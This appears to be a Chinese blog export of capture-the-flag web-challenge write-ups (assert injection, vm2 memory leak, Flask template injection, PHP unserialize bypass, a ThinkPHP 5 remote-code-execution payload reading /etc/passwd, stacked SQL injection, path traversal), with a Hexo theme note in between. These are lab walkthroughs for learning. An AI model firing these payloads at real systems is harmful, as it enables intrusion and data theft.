<p>有三个页面，但是看源码能看到一个flag页被注释掉了<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730681.png?x-oss-process=hzy" alt="image-20220707170831125"></p>
<p>访问一下发现是白页，应该是被拒绝访问</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730885.png?x-oss-process=hzy" alt="image-20220707170856516"></p>
<p>直接目录遍历发现不行</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730243.png?x-oss-process=hzy" alt="image-20220707171044535"></p>
<p>通过这个又知道网站基本情况</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730408.png?x-oss-process=hzy" alt="image-20220707171117103"></p>
<blockquote>
<p>该网站是用git托管源码,以及用PHP编写，有一个flag文件</p>
</blockquote>
<p>那就可能是git源码泄露，访问/.git</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730839.png?x-oss-process=hzy" alt="image-20220707171251928"></p>
<p>确认是git源码泄露之后使用githack把源码down下来</p>
<pre><code class="hljs plaintext">python3 githacker.py --url http://111.200.241.244:52612/ --folder result</code></pre>
<p>然后会在template/flag.php发现关键代码</p>
<pre><code class="hljs plaintext">&lt;?php

if (isset($_GET[&#x27;page&#x27;])) &#123;
   $page = $_GET[&#x27;page&#x27;];
&#125; else &#123;
   $page = &quot;home&quot;;
&#125;

$file = &quot;templates/&quot; . $page . &quot;.php&quot;;//用于拼接形成目录路径

// I heard &#x27;..&#x27; is dangerous!
assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;); // 这个就是刚才不能使用目录比案例的原因

// TODO: Make this look nice
assert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);
?&gt;</code></pre>
<p>assert函数，所以考虑是任意代码执行，assert函数对传入的参数可能会当作php代码进行执行</p>
<p>这个时候我们就可以把page后的参数进行闭合，传入可执行命令，并且注释掉后续的代码，这就实现了让assert函数执行任意命令</p>
<pre><code class="hljs plaintext">?page=&#x27;);//&#x27;</code></pre>
<p>说明闭合成功</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730749.png?x-oss-process=hzy" alt="image-20220707172028414"></p>
<p>继续进行命令注入</p>
<pre><code class="hljs plaintext">？page=&#x27;).system(&quot;ls&quot;); //
?page=%27).system(&quot;cat%20/var/www/html/templates/flag.php&quot;);//</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071730787.png?x-oss-process=hzy" alt="image-20220707172440816"></p>
<h1 id="leaking">leaking</h1>
<ul>
<li>nodejs沙箱逃逸</li>
</ul>
<p>这个方面的漏洞还没系统的学，这题边做边学吧</p>
<p>首先看源代码</p>
<pre><code class="hljs plaintext">
&quot;use strict&quot;;

var randomstring = require(&quot;randomstring&quot;);
var express = require(&quot;express&quot;);
var &#123;
    VM
&#125; = require(&quot;vm2&quot;);
var fs = require(&quot;fs&quot;);

var app = express();
var flag = require(&quot;./config.js&quot;).flag

app.get(&quot;/&quot;, function(req, res) &#123;
    res.header(&quot;Content-Type&quot;, &quot;text/plain&quot;);

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval(&quot;var flag_&quot; + randomstring.generate(64) + &quot; = \&quot;flag&#123;&quot; + flag + &quot;&#125;\&quot;;&quot;)
    if (req.query.data &amp;&amp; req.query.data.length &lt;= 12) &#123;
        var vm = new VM(&#123;
            timeout: 1000
        &#125;);
        console.log(req.query.data);
        res.send(&quot;eval -&gt;&quot; + vm.run(req.query.data));
    &#125; else &#123;
        res.send(fs.readFileSync(__filename).toString());
    &#125;
&#125;);

app.listen(3000, function() &#123;
    console.log(&quot;listening on port 3000!&quot;);
&#125;);</code></pre>
<p>由于第一个eval把flag读入了在内存中的全局变量<br>
所以只要我们能通过沙箱里的eval去读取内存中的内容的话，就可以形成沙箱逃逸</p>
<p>直接用Buffer()函数用于读取内存的内容，可以通过这个函数直接去读取全局内存中的内容<br>
由于内存的保护机制，并不是每一次都能读取到含有flag内容的代码，所以多执行几次脚本</p>
<pre><code class="hljs plaintext"># encoding=utf-8
import requests
import time
import re
url = &#x27;http://111.200.241.244:51125/?data=Buffer(500)&#x27;
response = &#x27;&#x27;
while &#x27;flag&#x27; not in response:
        req = requests.get(url)
        response = req.text
        print(req.status_code)
        time.sleep(0.1)
        if &#x27;flag&#123;&#x27; in response:
            print(re.findall(r&#x27;flag&#123;.+&#125;&#x27;,response))
            break</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071757578.png?x-oss-process=hzy" alt="image-20220707175723487"></p>
<h1 id="cat">Cat</h1>
<blockquote>
<p>抓住那只猫</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071758243.png?x-oss-process=hzy" alt="image-20220707175819174"></p>
<p>输入一个ip，看看什么功能</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071758901.png?x-oss-process=hzy" alt="image-20220707175845837"></p>
<p>发现会ping这个ip，那么利用分隔符漏洞就行，但是实践告诉我们，这样不行</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071800249.png?x-oss-process=hzy" alt="image-20220707180027178"></p>
<p>网站用的是php写的，但是这个Cloud端就不一定是php的了。</p>
<p>传参处?url=这里，我们传递个%79发现传递之后变成了?url=w，看来是可以传递url编码，系统会接受并进行解析，于是我们传递%80会出现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。url编码表可以参考http://www.w3school.com.cn/tags/html_ref_urlencode.html</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071803213.png?x-oss-process=hzy" alt="image-20220707180317132"></p>
<pre><code class="hljs plaintext">&lt;title&gt;UnicodeEncodeError at /api/ping&lt;/title&gt;

使用的是python站点
使用的是Django框架</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071804964.png?x-oss-process=hzy" alt="image-20220707180432831"></p>
<p>所以根据Django的目录，我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息。</p>
<p>我们的目标首先是数据库文件，看从错误信息中能不能拿到flag，可以从配置文件settings.py的报错中看看有没有database的相关信息</p>
<pre><code class="hljs plaintext">?url=@/opt/api/api/settings.py</code></pre>
<p>报错内容搜索database可以得到：</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071806360.png?x-oss-process=hzy" alt="image-20220707180632276"></p>
<pre><code class="hljs plaintext">?url=@/opt/api/database.sqlite3</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071807646.png?x-oss-process=hzy" alt="image-20220707180741591"></p>
<p>报错信息中搜索ctf，拿到WHCTF{yoooo_Such_A_G00D_@}</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/zz_Caleb/article/details/95041031">攻防世界-web-Cat(XCTF 4th-WHCTF-2017)_大千SS的博客-CSDN博客_攻防世界网址</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>新版next置换</title>
    <url>/2022/01/18/%E6%96%B0%E7%89%88next%E7%BD%AE%E6%8D%A2/</url>
    <content><![CDATA[<p>当旧版next主题失效时该怎么办</p>
<span id="more"></span>
<p>写这篇文章主要是害怕哪天自己的博客炸了，一时找不到解决办法，所以先写好以备不时之需。</p>
<h1 id="导入主题">导入主题</h1>
<pre><code class="hljs plaintext">git clone https://github.com/theme-next/hexo-theme-next themes/next</code></pre>
<p>然后打开站点配置，在theme里将landscape改为next，language把en修改成zh-CN。</p>
<h1 id="基础配置">基础配置</h1>
<p>在themes\next中的_config.yml中进行编辑</p>
<pre><code class="hljs plaintext">menu:
  home: / ||fa fa-home
  #about: /about/ || user
  tags: /tags/ ||fa fa-tags
  categories: /categories/ ||fa fa-th
  archives: /archives/ ||fa fa-archive
  #schedule: /schedule/ || calendar
  #sitemap: /sitemap.xml || sitemap
  #commonweal: /404/ || heartbeat
  links: /links/ ||fa fa-link</code></pre>
<p>文章分段栏</p>
<pre><code class="hljs plaintext">toc:
  enable: true #改成true以启用
  number: true #自动生成编号
  # 以下默认
  wrap: false
  expand_all: false
  max_depth: 6</code></pre>
<p>联系方式</p>
<pre><code class="hljs plaintext">social:
  #GitHub: https://github.com/HZY030628 || github
  E-Mail: mailto:2596328958@qq.com || envelope
  #Weibo: https://weibo.com/yourname || fab fa-weibo
  #Google: https://plus.google.com/yourname || fab fa-google
  #Twitter: https://twitter.com/yourname || fab fa-twitter
  #FB Page: https://www.facebook.com/yourname || fab fa-facebook
  #StackOverflow: https://stackoverflow.com/yourname || fab fa-stack-overflow
  #YouTube: https://youtube.com/yourname || fab fa-youtube
  #Instagram: https://instagram.com/yourname || fab fa-instagram
  #Skype: skype:yourname?call|chat || fab fa-skype</code></pre>
<p>头像</p>
<pre><code class="hljs plaintext">avatar:
  # Replace the default image and set the url here.
  url: /images/avatar.png
  # If true, the avatar will be dispalyed in circle.
  rounded: true #若为true，则头像为圆形
  # If true, the avatar will be rotated with the cursor.
  rotated: true #若为true，则鼠标碰到头像时旋转</code></pre>
<p>头像跟标签页图标一样，需要把图片复制粘贴到image中，再修改文件名。</p>
]]></content>
      <categories>
        <category>博客相关问题类</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>next主题失效</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界web高手进阶区(一)</title>
    <url>/2022/06/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E5%8C%BA(%E4%B8%80)/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261343729.png?x-oss-process=hzy" alt="image-20220626134350561"></p>
<span id="more"></span>
<h1 id="baby_web">baby_web</h1>
<blockquote>
<p>想想初始页面是哪个</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251558822.png?x-oss-process=hzy" alt="image-20220625155802774"></p>
<p>有提示，初始页是index.php,但是直接在浏览器访问会很快跳转，可以f12，也可以bp抓包都行，这里我直接f12了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251600549.png?x-oss-process=hzy" alt="image-20220625160026459"></p>
<pre><code class="hljs plaintext">flag&#123;very_baby_web&#125;</code></pre>
<h1 id="php2">PHP2</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251550702.png?x-oss-process=hzy" alt="image-20220625155029520"></p>
<p>题目是php2，所以就御剑扫一下，得到路径是有<code>/index.php</code>和<code>/index.phps</code>,访问一下在phps里面看到了代码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251551606.png?x-oss-process=hzy" alt="image-20220625155156553"></p>
<p>分析一下，首先不能让第一个if语句满足，要对admin进行url编码，然后需要满足第二个if语句，从而得到flag</p>
<blockquote>
<p>当传入参数id时，浏览器在后面会对非ASCII码的字符进行一次urlencode编码，运行时会自动进行一次urldecode</p>
</blockquote>
<p>因为我们在url连接里直接运行，浏览器会进行一次url解码，所以我们还要进行一次url编码，就是对admin进行两次编码再运行</p>
<pre><code class="hljs plaintext">urldecode(%2561)=%61  
urldecode(%61)=a</code></pre>
<p>所以最后的payload是</p>
<pre><code class="hljs plaintext">?id=%2561dmin</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251555246.png?x-oss-process=hzy" alt="image-20220625155502178"></p>
<pre><code class="hljs plaintext">cyberpeace&#123;97dd863245b712ede4c62c9c0acf0ce0&#125;</code></pre>
<h1 id="training-www-robots">Training-WWW-Robots</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251556232.png?x-oss-process=hzy" alt="image-20220625155620170"></p>
<p>看题目应该也知道需要干啥了，看robots.txt</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251556511.png?x-oss-process=hzy" alt="image-20220625155642461"></p>
<p>访问得到flag</p>
<pre><code class="hljs plaintext">cyberpeace&#123;6476bf5f013b5b6852f65b11200c87c1&#125;</code></pre>
<h1 id="ics-06">ics-06</h1>
<blockquote>
<p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251602653.png?x-oss-process=hzy" alt="image-20220625160213446"></p>
<p>花里胡哨，啥都点不了，就那个报表中心可以点</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251603616.png?x-oss-process=hzy" alt="image-20220625160353561"></p>
<p>日期填啥都不行，但是看到了路径里的id=1，sql注入也没有，是我想多了，但是真不知道咋写，抓包爆破值看看</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251607674.png?x-oss-process=hzy" alt="image-20220625160729623"></p>
<p>果然这么无聊。。。。</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251607834.png?x-oss-process=hzy" alt="image-20220625160755777"></p>
<h1 id="web_python_template_injection">Web_python_template_injection</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251608714.png?x-oss-process=hzy" alt="image-20220625160842656"></p>
<p>python模板注入(SSTI)，这个和python的<a href="https://so.csdn.net/so/search?q=flask&amp;spm=1001.2101.3001.7020">flask</a>模板漏洞有关，尝试使用flask模板的漏洞试试，构造的payload为：<code>/&#123;&#123;6*6&#125;&#125;</code></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251610296.png?x-oss-process=hzy" alt="image-20220625161002232"></p>
<p>没毛病老铁，就是这个漏洞,再试试查看config文件<code>/&#123;&#123;config&#125;&#125;</code></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251612736.png?x-oss-process=hzy" alt="image-20220625161210643"></p>
<p>可以看到配置文件包也没有被禁用，所以直接查看服务器的本地文件有啥</p>
<pre><code class="hljs plaintext">/&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</code></pre>
<blockquote>
<p>class：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。<br>
init 初始化类，返回的类型是function<br>
globals[] 使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。<br>
os.popen() 方法用于从一个命令打开一个管道。</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251616775.png?x-oss-process=hzy" alt="image-20220625161602723"></p>
<p>嘿嘿，看到了想要的了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251617451.png?x-oss-process=hzy" alt="image-20220625161731382"></p>
<h1 id="web_php_unserialize">Web_php_unserialize</h1>
<ul>
<li>php反序列化</li>
</ul>
<pre><code class="hljs plaintext">&lt;?php 
class Demo &#123;  // 定义一个名为Demo的类
    private $file = &#x27;index.php&#x27;; //变量的属性
    public function __construct($file) &#123;   //这个类使用的类方法_construct函数
        $this-&gt;file = $file; 
    &#125;
    function __destruct() &#123; 
        echo @highlight_file($this-&gt;file, true);   //这个类使用的类方法__destruct函数
    &#125;
    function __wakeup() &#123;           // __wakeup ，这个函数要跳过去，因为他要是执行就会返回到index.php
        if ($this-&gt;file != &#x27;index.php&#x27;) &#123; 
            //the secret is in the fl4g.php   
            $this-&gt;file = &#x27;index.php&#x27;; 
        &#125; 
    &#125; 
&#125;
if (isset($_GET[&#x27;var&#x27;])) &#123;      //判断是否传入了参数
    $var = base64_decode($_GET[&#x27;var&#x27;]);     //对传入的参数进行加密
    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;, $var)) &#123;    //正则检查
        die(&#x27;stop hacking!&#x27;); 
    &#125; else &#123;
        @unserialize($var);    //进行反序列化
    &#125; 
&#125; else &#123; 
    highlight_file(&quot;index.php&quot;); 
&#125; 
?&gt;</code></pre>
<p>这里分析一下如何得到最终的flag</p>
<p>第一步我也说了，需要绕过去那个_wakeup函数</p>
<blockquote>
<p>**__wakeup()**是在反序列化操作中起作用的魔法函数，当unserialize的时候，会检查是否存在__wakeup()函数，如果存在的话，会优先调用__wakeup()函数。</p>
</blockquote>
<p>绕过方法：_wakeup函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就会调用这个函数，但是如果这个数字大于真实属性的个数，那就会绕过这个函数。</p>
<p>第二步绕过正则检查，否则就直接输出stop了，这个正则检查这句拉出来单独再分析一下</p>
<blockquote>
<p>正则匹配的规则是:在不区分大小写的情况下 ， 若字符串出现 “o:数字” 或者 &quot;c:数字’ 这样的格式 ， 那么就被过滤。很明显，因为 serialize() 的参数为 object ，因此参数类型肯定为对象 &quot; O &quot; ， 又因为序列化字符串的格式为 参数格式:参数名长度 ， 因此 &quot; O:4 &quot; 这样的字符串肯定无法通过正则匹配</p>
</blockquote>
<p>绕过方法：O:+4不会被过滤，且最后的值不会发生变化</p>
<p>第三步绕过就是要是base64加密</p>
<p>绕过方法:直接加密就行。</p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">&lt;?php 
class Demo &#123; 
    private $file = &#x27;index.php&#x27;;
    public function __construct($file) &#123; 
        $this-&gt;file = $file; 
    &#125;
    function __destruct() &#123; 
        echo @highlight_file($this-&gt;file, true); 
    &#125;
    function __wakeup() &#123; 
        if ($this-&gt;file != &#x27;index.php&#x27;) &#123; 
            //the secret is in the fl4g.php
            $this-&gt;file = &#x27;index.php&#x27;; 
        &#125; 
    &#125; 
&#125;

//创建对象
$a = new Demo(&#x27;fl4g.php&#x27;);
//对对象1进行序列化
$b = serialize($a);
//绕过正则
$b = str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;,$b);
//绕过_wakeup函数
$b = str_replace(&#x27;:1:&#x27;,&#x27;:2:&#x27;,$b);
//base加密
var_dump($b);
var_dump(base64_encode($b));
?&gt;</code></pre>
<pre><code class="hljs plaintext">运行结果
string(49) &quot;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&quot;
string(68) &quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==&quot;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251644569.png?x-oss-process=hzy" alt="image-20220625164444504"></p>
<h1 id="php_rce">php_rce</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251645107.png?x-oss-process=hzy" alt="image-20220625164539029"></p>
<p>THINKPHP v5框架漏洞</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251648695.png?x-oss-process=hzy" alt="image-20220625164829635"></p>
<p>在网上找个exp直接打</p>
<p><a href="https://blog.csdn.net/qq_39281549/article/details/120260824">Thinkphp5.0.20漏洞</a></p>
<pre><code class="hljs plaintext">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1
// phpinfo</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251650875.png?x-oss-process=hzy" alt="image-20220625165001784"></p>
<p>存在漏洞，利用就完了</p>
<pre><code class="hljs plaintext">？s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/etc/passwd //查看敏感文件</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251651291.png?x-oss-process=hzy" alt="image-20220625165128191"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251652663.png?x-oss-process=hzy" alt="image-20220625165215612"></p>
<h1 id="supersqli">supersqli</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251653607.png?x-oss-process=hzy" alt="image-20220625165334545"></p>
<p>只有1，2有数据，加<code>‘</code>就报错</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251655053.png?x-oss-process=hzy" alt="image-20220625165556993"></p>
<p>典型sql注入</p>
<p>猜字段</p>
<pre><code class="hljs plaintext">1&#x27; order by 2#</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251657645.png?x-oss-process=hzy" alt="image-20220625165725594"></p>
<pre><code class="hljs plaintext">1&#x27;&#x27; union select 1,2#</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251658077.png?x-oss-process=hzy" alt="image-20220625165808025"></p>
<p>被过滤了，采用堆叠注入，先查询数据库</p>
<pre><code class="hljs plaintext">1’;show databases;--+</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251700782.png?x-oss-process=hzy" alt="image-20220625170001721"></p>
<p>查表</p>
<pre><code class="hljs plaintext">1&#x27;;show tables;--+</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251700223.png?x-oss-process=hzy" alt="image-20220625170030160"></p>
<p>分别查询两个表的字段</p>
<pre><code class="hljs plaintext">1&#x27;; show columns from `1919810931114514` ;--+
1’; show columns from words;--+</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251704632.png?x-oss-process=hzy" alt="image-20220625170405564"><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251709296.png?x-oss-process=hzy" alt="image-20220625170905218"></p>
<p>查询字段内容</p>
<p>两种方法</p>
<ul>
<li>
<p>改表名</p>
<p>根据在words表里发现id字段与查询框里的出的数据类型相同，一个数字，一个字符串，所以猜测默认查询的就是words表，inject（搜索框中）值应该赋给了id<br>
<strong>利用</strong>：我们可以将含有flag字段的表命名为word，然后修改字段名字，不就查询到我们想要的结果！（前提是这里rename，alert关键字 没有做过滤）</p>
<pre><code class="hljs plaintext"> ; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #
 拆开：
;  alter tables words rename to words1; 
;  alter tables `1919810931114514` rename to words ;
;  alter tables words change flag id varchar(50); #</code></pre>
<p>查看flag：</p>
<pre><code class="hljs plaintext">1&#x27; or 1=1 #  //即可得到</code></pre>
</li>
<li>
<p>预编译</p>
<p>payload</p>
</li>
</ul>
<pre><code class="hljs plaintext">1&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</code></pre>
<blockquote>
<p>';sEt @sql = CONCAT(‘se’,‘lect * from <code>1919810931114514</code>;’); 进行预编译<br>
prEpare stmt from @sql; 设置变量<br>
EXECUTE stmt;# 执行</p>
</blockquote>
<p>flag{c168d583ed0d4d7196967b28cbd0b5e9}</p>
<h1 id="warmup">warmup</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251718905.png?x-oss-process=hzy" alt="image-20220625171823805"></p>
<p>啥也没有，看源码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251718032.png?x-oss-process=hzy" alt="image-20220625171841977"></p>
<p>得到提示，访问/source.php,得到代码</p>
<pre><code class="hljs plaintext">&lt;?php
    highlight_file(__FILE__);
    class emmm
    &#123;
        public static function checkFile(&amp;$page)
        &#123;
            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
            if (! isset($page) || !is_string($page)) &#123;
                echo &quot;you can&#x27;t see it&quot;;
                return false;
            &#125;

            if (in_array($page, $whitelist)) &#123;
                return true;
            &#125;

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)
            );
            if (in_array($_page, $whitelist)) &#123;
                return true;
            &#125;

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)
            );
            if (in_array($_page, $whitelist)) &#123;
                return true;
            &#125;
            echo &quot;you can&#x27;t see it&quot;;
            return false;
        &#125;
    &#125;

    if (! empty($_REQUEST[&#x27;file&#x27;])
        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])
        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])
    ) &#123;
        include $_REQUEST[&#x27;file&#x27;];
        exit;
    &#125; else &#123;
        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
    &#125;  
?&gt;</code></pre>
<p>有个hint.php,访问一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251720630.png?x-oss-process=hzy" alt="image-20220625172041581"></p>
<p>分析源码</p>
<pre><code class="hljs plaintext">if (! empty($_REQUEST[&#x27;file&#x27;])
       &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])
       &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])
   ) &#123;
       include $_REQUEST[&#x27;file&#x27;];
       exit;
   &#125; else &#123;
       echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
   &#125;</code></pre>
<blockquote>
<p>empty() 函数用于检查一个变量是否为空。<br>
empty() 判断一个变量是否被认为是空的。当一个变量并不存在，或者它 的值等同于 FALSE，那么它会被认为不存在。</p>
</blockquote>
<p>发现最底部的if语句为执行条件，有三个条件，第一个判断文件不能为空（检查是否传了file参数），第二这个传的参数是<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&amp;spm=1001.2101.3001.7020">字符串</a>，第三要过白名单检测，过了之后包含 隐藏了flag的文件。再看上面的if语句，白名单是hint.php，又有mb_strpos和mb_substr截取内容，所以只需要输入 source.php?file=source.php?即可绕过白名单检测，然后在输入…/逐级跳转目录读取flag即可，可以一个一个试</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251724566.png?x-oss-process=hzy" alt="image-20220625172424490"></p>
<pre><code class="hljs plaintext">http://111.200.241.244:54166/source.php?file=source.php?../../../../../ffffllllaaaagggg</code></pre>
<p>参考：</p>
<p><a href="https://blog.csdn.net/m0_53314778/article/details/112629012">warmup</a></p>
<h1 id="newscenter">NewsCenter</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251729264.png?x-oss-process=hzy" alt="image-20220625172907213"></p>
<p>环境有点问题，没做</p>
<h1 id="nannannannan-batman">NaNNaNNaNNaN-Batman</h1>
<p>附件题，附件内容有不可见字符，总之就是js代码，当我看到<script>标签时就觉得改成html看看</p>
<p>这才是源代码</p>
<pre><code class="hljs plaintext">function $()&#123;
var e=document.getElementById(&quot;c&quot;).value;       //正则表达式
if(e.length==16)                        //输入为16位
   if(e.match(/^be0f23/)!=null)
      if(e.match(/233ac/)!=null)
         if(e.match(/e98aa$/)!=null)
            if(e.match(/c7be9/)!=null)&#123;    		//flag
               var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];
               var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];
               var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];
               var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];
               var s=[t,n,r,i];
               for(var o=0;o&lt;13;++o)&#123;
                  document.write(s[o%4][0]);s[o%4].splice(0,1)
                  &#125;
               &#125;
            &#125;
            document.write(&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button οnclick=$()&gt;Ok&lt;/button&gt;&#x27;);
            delete</code></pre>
<p>首先要满足length==16，正则的话^为开始符号，$为结尾符号，拼接一下：be0f233ac7be98aa</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251736089.png?x-oss-process=hzy" alt="image-20220625173602031"></p>
<p>参考:</p>
<p><a href="https://blog.csdn.net/Mr_helloword/article/details/107928932">https://blog.csdn.net/Mr_helloword/article/details/107928932</a></p>
<h1>web2</h1>
<pre><code class="hljs plaintext">&lt;?php
$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;
 
function encode($str)&#123;
    $_o=strrev($str); // strrev函数作用是进行反转
    // echo $_o;
        
    for($_0=0;$_0&lt;strlen($_o);$_0++)&#123;
       
        $_c=substr($_o,$_0,1);  // substr函数作用是返回字符串的一部分
        $__=ord($_c)+1;  // ord函数是返回第一个字母的ascll值，这里是返回之后再加1
        $_c=chr($__);  // chr函数是从指定的ascll值返回到字符
        $_=$_.$_c;   
    &#125; 
    return str_rot13(strrev(base64_encode($_)));  // str_rot13函数就是常见的rot13加密
&#125;
 
highlight_file(__FILE__);
/*
   逆向加密算法，解密$miwen就是flag
*/
?&gt;</code></pre>
<blockquote>
